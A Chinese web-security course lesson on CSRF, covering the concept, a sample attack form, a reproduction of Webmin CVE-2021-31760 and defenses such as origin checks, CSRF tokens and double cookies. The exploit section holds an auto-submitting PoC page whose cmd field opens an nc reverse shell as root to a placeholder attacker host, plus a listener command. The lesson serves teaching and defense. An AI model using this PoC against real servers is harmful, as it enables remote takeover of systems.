# 05 | CSRF：为什么用户的操作他自己不承认？

你好，我是王昊天。

想象你是个青春阳光的精神小伙，和女神小美青梅竹马，培养了十几年的感情。眼看着就要抱得美人归时，半路杀出了个男二号，成了你的竞争对手。有一天你们恰好在一起聚会，男二号趁你上厕所，用你的手机给小美发了微信。

“小美，你闺蜜真好看，可以介绍给我吗？”

你回来时，小美大骂了你一通，然后生气地摔门而去。

在这个故事里，男二就通过他的行为完成了一次 CSRF。

## CSRF

CSRF 的全名是 Cross-Site Request Forgery，中文名称是跨站点请求伪造，简单来说，就是让 Web 应用程序不能有效地分辨一个外部的请求，是否真正来自发起请求的用户，虽然这个请求可能是构造完整、并且输入合法的。

和前几节课程中学习过的漏洞相比，CSRF 有自己的漏洞名称，明显是一个更为细分的漏洞类型，而非一个漏洞类别。它作为一个独立的细分漏洞类型，值得我们单独进行探讨，说明影响力是足够大的。

扩展开讲一讲，当一个 Web 应用在设计过程中没有充分考虑来自客户端请求的验证机制时，就可能会遇到 CSRF 问题。站在攻击者的视角来看，他可以通过一个 URL、图片加载或者XMLHttpRequest 等方式，让用户触发一个自动化请求发送行为，这个请求在 Web Server 接受时会被认为是合法的。

接下来我们看一个典型的攻击场景。

如下 HTML 目的是让用户更新自己的信息：

```sql
<form action = "/url/profile.php" method = "post">
   <input type = "text" name = "firstname" />
   <input type = "text" name = "lastname" />
   <br/>
   <input type = "text" name = "email" />
   <input type = "submit" name = "submit" value = "Update" />
</form>
```

其中的 profile.php 包含如下代码：

```sql
// initial the seesion in order to validate sessions
session_start();
// if the session is registered a valid user the allow update
if ( !session_is_registered("username") )
{
   echo "invalid session detected!";
   // Redirect user to login page
   ...
   exit;
}
// The user session is valid, so process the request
// and update the information
update_profile();
```

这里的 PHP 代码中是包含了一些保护措施的，结合我们前面几节课程学到的内容来看，它包含了用户身份的有效性认证，阻止了越权访问。但是上述代码并不能够有效地防止 CSRF 攻击，如果攻击者可以构建下面这段代码，并且将它托管到某个站点，那么当用户保持登录状态并且访问攻击代码页面时，就会触发攻击代码：

```xml
<script>
   function attack()
   {
       form.email = "attacker@example.com"
       form.submit();
   }
<script>
<body onload = "attack()">
   // ...
</body>
```

可以看到，上述攻击代码包含了用户在使用浏览器时不可见的内容，当攻击代码在浏览器中加载时，会触发 attack 函数。如果用户在访问受害网站时保持的登录状态，受害网站就会收到来自用户的请求，请求内容是将 E-mail 更新为攻击者的邮件地址。这样在后续的攻击操作中，例如邮件验证码等操作都会发送到攻击者邮箱。

通过上述典型的攻击代码，我们可以总结出几点 CSRF 攻击特征：

- 攻击一般发生在跨域场景下，主要原因是外域相较于被攻击目标通常安全级别更低，攻击者更容易控制；

- CSRF 在攻击过程中事实上并没有获取到用户的登录凭据，只是借用户之手发送了恶意的请求；

- 攻击者可以采用的方式有很多：图片 URL、超链接、表单提交等许多方式。

## 案例实战

### CVE-2021-31760

我为你准备了一份新鲜又甜美可口的漏洞，来实际体验 CSRF 漏洞挖掘过程以及实际利用效果，那么不卖关子了，直接上漏洞编号——CVE-2021-31760。

首先介绍一下 Webmin，Webmin 是一个基于 Web 的系统配置工具，它是一款开源工具，主要由杰米·卡梅隆（Jamie Cameron）和 Webmin 社区进行共同维护。Webmin 允许用户配置操作系统内部信息，例如用户、磁盘配额、服务或配置文件，以及修改和控制开源应用，例如Apache http 服务器或 MySQL 等。CVE-2021-31760 主要影响 Webmin 1.973 版本，通过CSRF 漏洞的利用可以实现远程命令执行（RCE）的效果。

该漏洞环境已经在谜团MiTuan上构建完成，你可以直接访问谜团搜索 CVE-2021-31760 进行复现。

### 漏洞挖掘过程

接下来我们进入漏洞挖掘过程，来看该漏洞是如何被发现的。

首先从官方的 GitHub 仓库下载 1.973 版本的源代码，官方仓库地址是GitHub -webmin/webmin: Powerful and flexible web-based server management control panel。然后进入如下目录，选择 run.cgi 文件打开：

```
hunter@HunterdeiMac  ~/Downloads/webmin/proc  vim run.cgi
```

通过查看程序代码主体可以发现代码中并没有关于访问来源的审计：

```
...
$in{'input'} =~ s/\r//g;
$cmd = $in{'cmd'};
if (&supports_users()) {
   defined(getpwnam($in{'user'})) || &error($text{'run_euser'});
   &can_edit_process($in{'user'}) || &error($text{'run_euser2'});
   if ($in{'user'} ne getpwuid($<)) {
       $cmd = &command_as_user($in{'user'}, 0, $cmd);
       }
   }
if ($in{'mode'}) {
   # fork and run..
   if (!($pid = fork())) {
       close(STDIN); close(STDOUT); close(STDERR);
       &open_execute_command(PROC, "($cmd)", 0);
       print PROC $in{'input'};
       close(PROC);
       exit;
       }
   &redirect("index_tree.cgi");
   }
else {
   # run and display output..
   &ui_print_unbuffered_header(undef, $text{'run_title'}, "");
   print "<p>\n";
   print &text('run_output', "<tt>".&html_escape($in{'cmd'})."</tt>"),"<p>\n";
   print "<pre>";
   $got = &safe_process_exec_logged($cmd, 0, 0,
                    STDOUT, $in{'input'}, 1);
   if (!$got) { print "<i>$text{'run_none'}</i>\n"; }
   print "</pre>\n";
   &ui_print_footer("", $text{'index'});
   }
&webmin_log("run", undef, undef, \%in);
```

通过分析源码我们得知代码没有针对 CSRF 的保护措施，因此我们只需很简单的 CSRF 构造即可触发该漏洞，并且由于该漏洞触发点是 run.cgi 文件，我们可以直接通过 CSRF 构建RCE（远程命令执行），这是非常理想的漏洞利用场景。

### 漏洞利用

接下来我们通过构造 PoC，尝试利用这个漏洞。

首先我们来构造一个 HTML 文件，这个 HTML 的核心目标是进行 form 表单的自动提交，源码如下：

```xml
<html>
       <head>
           <meta name="referrer" content="never">
       </head>
 <body>
   <form action="http://your_mituan_app_address/proc/run.cgi" method="POST">
     <input type="hidden" name="cmd" value="mkfifo /tmp/378; nc your_ip your_por
     <input type="hidden" name="mode" value="0" />
     <input type="hidden" name="user" value="root" />
     <input type="hidden" name="input" value="" />
     <input type="hidden" name="undefined" value="" />
     <input type="submit" value="Submit request" />
   </form>
   <script>
     document.forms[0].submit();
   </script>
 </body>
</html>
```

其中主要参数是 cmd 字段，其含义是：

1. 创建一个命名管道 378；

2. Webmin 作为客户端使用 nc 连接黑客控制的服务端，接收命令，并通过匿名管道将命令重定向到 bash；

3. bash 执行服务端发过来的命令，将输出重定向到命名管道 378，并通过命名管道 378 将输出重定向到 nc 发送给服务端。

这一条命令实际包含了两条管道，一条匿名管道，一条命名管道，并使其各司其职。它先后将html 文件中的 your_mituan_app_address、your_ip、your_port 替换为谜团启动的应用URL、你的服务器地址、你的服务器 IP，即可开始 CSRF 攻击。

让我们看看这次攻击经历了哪些流程：首先我们以管理员身份登录 Webmin 界面，在自己的服务器上启动 nc 进行监听：nc -l -p 1337，然后使用浏览器直接打开我们创建的 HTML 页面，到这里我们的攻击就已完成，服务器上的 nc 已经接入 Webmin 服务器的 bash，可以执行任意命令。

### 漏洞分析

既然已经成功利用了该漏洞，接下来我们就要分析这一类漏洞该如何修复。最简单的方式就是校验这次访问的来源。事实上，Webmin 已经做了这种防御。你肯定会有疑问，为什么做了防御仍然会出现 CVE-2021-31760 漏洞呢？其实这是由于一个配置项引起的，在构建 Webmin平台的过程中，我们对 config 文件进行了修改：

```
/etc/webmin/config -> referers_none=0
```

在官方的说明中，该项就是在判断不同来源的 request 能否生效，你可以通过如下命令修改配置并重启 Webmin 服务：

```
// 将referers_none=0修改为referers_none=1
vim /etc/webmin/config
// 重启webmin服务
service webmin restart
```

再次尝试就会发现该漏洞已经消失了，这也是我在追踪这个漏洞时惊讶的点。也许正是这个原因，截至写稿时，Webmin 已经在存在漏洞的版本发布了至少 5 次更新，但是却并没有修复该漏洞。

到这里你肯定更好奇了，既然 Webmin 有相关的保护措施，那 CVE-2021-31760 这个漏洞是否真实存在呢？

这是个好问题，我们继续来深挖一下：

首先，该配置项是如何生效的？

通过对源码的追踪分析，我们可以发现存在如下函数调用链：

```javascript
# run.cgi
# line 5
require './proc-lib.pl';
&ReadParse();
$access{'run'} || &error($text{'run_ecannot'});
...
# proc-lib.pl
# line 9
&init_config();
...
# web-lib-funcs.pl
# line 5142
   if (!$gconfig{'referers_none'}) {
       # Known referers are allowed
       $trust = 1;
       }
   elsif ($trustvar == 2) {
       # Module wants to trust unknown referers
       $trust = 1;
       }
   else {
       $trust = 0;
       }
   }
...
# webmin/web-lib-funcs.pl
# line 5205
# function init_config
...
if (!$trust) {
   # Looks like a link from elsewhere .. show an error
   $current_theme = undef;
   &header($text{'referer_title'}, "", undef, 0, 1, 1);
   $prot = lc($ENV{'HTTPS'}) eq 'on' ? "https" : "http";
   my $url = "<tt>".&html_escape("$prot://$ENV{'HTTP_HOST'}$ENV{'REQUEST_URI'}")
   if ($referer_site) {
       # From a known host
       print &text('referer_warn',
               "<tt>".&html_escape($r)."</tt>", $url);
       print "<p>\n";
       print &text('referer_fix1', &html_escape($http_host)),"<p>\n";
       print &text('referer_fix2', &html_escape($http_host)),"<p>\n";
       }
   else {
       # No referer info given
       print &text('referer_warn_unknown', $url),"<p>\n";
       print &text('referer_fix3u'),"<p>\n";
       print &text('referer_fix2u'),"<p>\n";
       }
   print "<p>\n";
   &footer();
   exit;
   }
...
```

至此，我们发现 referers_none 配置项的启用，可以影响到 run.cgi 的工作流程，使其对于包含不同 referers 的 http request 继续提供支持。

是否该项配置项就足够了呢？其实答案是否定的，因为 CSRF 漏洞一般发生在跨域场景，但是这句话并不绝对，对于同域场景发生的 CSRF 攻击，上述配置项是难以抵御的。虽然同域场景对攻击者的能力有更高的要求，但是一旦问题发生，我们可以看到 root 权限级别的 RCE仍然是非常恐怖的。

那么如何从开源代码中学习漏洞挖掘以及安全开发呢？授人以鱼不如授人以渔，这个漏洞的学习除了本身的知识点，更重要的是如何通过对一个 CVE 漏洞的分析，去掌握漏洞分析和修复的规律。

在分析一个漏洞时，一定要分析清楚函数调用关系，清晰地了解输入是经过怎样的过程最终影响到输出的。然后一个有质量的漏洞，产品团队一般会在漏洞公布的第一时间进行修复，我们可以使用 GitHub 的版本比对功能，拿漏洞出现的版本与修复后版本进行源码比对，通过这样的方式可以帮助我们了解优秀的项目是如何解决同类安全问题的。

通过这种方式，我们可以学习到很多优秀宝贵的经验，快速提升我们的开发水平。

## 防御及检测

根据 CSRF 的攻击特点，我们可以采用以下几种方式进行防御：

1. 同源策略

该防御策略的产生主要为了针对 CSRF 攻击的第一个特征——跨域场景，它的设计思路主要是禁止外域（或者不受信任的域名）对 Web Server 发起请求。在 HTTP 协议中，有两个Header 字段可以用来帮助我们判断来源域：Origin Header 和 Referer Header。这两个字段在浏览器发送请求时会自动携带，并且不能由前端修改。

你可能会有疑问：这两个字段很明显是依赖于浏览器实现的，现在浏览器种类那么多，如果浏览器不支持怎么办？必须承认，这是个很好的问题，HTTP 协议标准本身在动态更新，很多比较旧版本的浏览器可能不支持这个 Policy，如果出现这种情况最好的策略就是阻止这次请求。

2. Token

回顾我们在总结 CSRF 特点时提到的特征，CSRF 一般发生在跨域场景下，但是并不绝对。如果攻击者是在本域发起的 CSRF 攻击，那么同源策略就会失效，因此我们需要一种更严格的防护策略——CSRF Token。

那么 CSRF Token 如何实现呢？为每一个 form 表单生成唯一的 token，并且在 form 提交时验证 token，就是 CSRF Token 的实现思路，但是 token 需要保证不可预测。在代码实现上主要有 2 种思路。

第一种是在用户访问页面时，由服务器生成 Token，将生成的 Token 存放于 Session 中，一般 Token 生成时会通过加密算法实现，输入一般包括随机字符串、时间戳等，要注意 Token也会有有效期。

第二种是每次加载页面时通过 JS 遍历 DOM 树结构插入 Token：

```
GET: http://example.com?csrf_token=value
POST: <input type = "hidden" name = "csrf_token" value = "value"/>
```

了解了客户端实现之后，你肯定自然地想到了后面的问题——服务端收到 HTTP 请求后怎么验证 token 的正确性呢？

要注意，对于分布式 Web 应用，使用 Session 存储 Token 会非常不方便，所以一般采用中间件存储或者动态计算的方式来优化。中间件存储方案是将 Token 存储在 Redis 中间件上，这样可以保证不同服务器取得的 token 值一致；动态计算方案是 Token 的原始输入不再采用随机数，而是采用 UID 等用户信息，同时加密算法采用对称加密算法，这样可以保证任何一台分布式服务器取到 Token 后都可以执行解密操作并进行数据正确性比对。

3. 接口设计

对于同源策略的实现，是有一些特殊的场景需要被作为例外处理的。按照我们之前的设计，用户来自搜索引擎链接的跳转会被无差异判定为 CSRF 攻击，这时我们就要判断特定情况并进行放行处理，一般情况下我们都会放行 GET 请求。但此时如果 Web 应用实现上允许用户通过 GET 请求发送敏感操作，就会出现安全问题。这提醒我们，不要在 GET 请求中允许用户执行敏感操作。

这里我们可以引入一个更形象的、非技术手段的抵制 CSRF 的案例——人工形态的CSRF_Token，在许多重要的支付环节，都需要在最后一步发送手机验证码、邮件验证码或者进行人脸识别，其实这就是通过应用流程设计的角度实现的一种 CSRF_Token 变种验证操作。

现在的防御方案，主要考虑的是如何防止跨域的 CSRF。因为攻击者无法获取到 Token，所以大家会普遍认为，本域发生的 CSRF 暂时是安全的。但是，如果 XSS 和 CSRF 问题同时在本域发生，由于 XSS 可以让攻击者获取 Token，CSRF 的防御就宣告失效。因此我们需要在Web 应用设计和开发过程中，严格过滤用户的输入，确保用户不能够输入我们不希望出现的内容，这样可以同时规避掉 XSS 和 CSRF 安全风险。

4. 双重 Cookie

在 Web 应用开发中新增 CSRF_Token 机制还是稍有些麻烦，那么我们该如何通过现有的组件，来实现 CSRF 防御方案呢？答案是双重 Cookie。

当用户访问 Web 网站时，Web 应用为用户随机生成一个新的 Cookie 值，当 Web 应用每次执行表单提交操作时都需要携带这个 Cookie 值；由于同源策略的保护，攻击者无法获取或者修改这个 Cookie 项，因此实现了 CSRF 的保护。

但要注意的是这项技术需要用到 JavaScript，因此在一些 JavaScript Disabled 的浏览器中是无法工作的。

除此以外，双重 Cookie 也面临一些风险。比如本域 Web 应用存在 XSS 漏洞，该防御将失效。以及为了确保 Cookie 传输安全，需要采用整站 HTTPS，否则 Cookie 泄露也会导致该防御失效。

## 总结

这节课我们探讨了一类主流的安全风险——CSRF，首先我们列出了 CSRF 风险的常见特征：首先，由于外域更容易被攻击者控制，攻击一般发生在跨域场景下；其次，CSRF 在攻击过程中并没有获取到用户的登录凭据，只是借用户之手发送了恶意的请求；最后，攻击者可以采用图片 URL、超链接、表单提交等许多方式实现攻击。

然后我们以 2021 年上半年的一个 CSRF RCE 漏洞为例，对它进行了实例分析，这个过程中我们首先完成了对 CVE-2021-31760 漏洞的复现，并针对该漏洞修复方案进行评估，然后又通过这个漏洞，学习了漏洞挖掘、漏洞分析以及漏洞修复方法。

最后我们给出了一些业内普遍认可的，新颖的解决方案，供你在工作中使用，他们分别是：同源策略、CSRF Token、接口设计层保护、双重 Cookie 和 Samesite Cookie

以上，就是关于 CSRF 我们一起学习探讨的内容，欢迎大家在评论区留言讨论。什么？你说Samesite Cookie 没讲？那就作为课后作业吧！

## 思考题

为了防御 CSRF，除了上述安全方案，业内提出了一种新的解决方案——Samesite Cookie，你可以通过自己的研究，讲讲它和双重 Cookie 的区别吗？

欢迎在评论区留下你的思考，我们下节课再见！
